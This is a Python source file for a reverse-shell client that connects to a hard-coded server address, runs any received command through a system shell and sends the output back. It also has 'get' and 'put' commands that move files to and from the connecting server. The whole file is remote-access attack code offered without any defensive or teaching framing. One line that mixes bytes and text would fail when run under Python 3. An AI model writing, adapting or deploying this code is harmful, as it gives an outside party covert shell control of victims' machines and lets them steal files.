import socket
import subprocess
import os

BUFFER_SIZE = 4096

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(BUFFER_SIZE)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(BUFFER_SIZE)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())

def upload(s, path):
    path = path.split('/')[-1]
    f = open(path, 'wb')
    while True:
        bits = s.recv(BUFFER_SIZE)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            break
        f.write(bits)


def connecting():
    s = socket.socket()
    s.connect(("192.168.1.13", 1234)) # Server IP and Listening Port

    while True:
        command = s.recv(BUFFER_SIZE)

        if command.decode().startswith("terminate") or command.decode().startswith("exit"):
            s.close()
            break
        elif command.decode().startswith("get|"):
            _, path = command.decode().split("|")
            try:
                transfer(s, path)
            except:
                pass
        elif command.decode().startswith("put|"):
            _, path = command.decode().split("|")
            try:
                upload(s, path)
                s.send('[+] Transfer Complete'.encode())
            except:
                s.send('[-] There was a problem with the transfer'.encode())
        elif command.decode().startswith("cd"):
            _, path = command.decode().split(" ", 1)
            os.chdir(path)
            s.send(os.getcwd().encode())
            
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(CMD.stderr.read() + "\n" + CMD.stdout.read())
            
def main():
    connecting()


if __name__ == '__main__':
    main()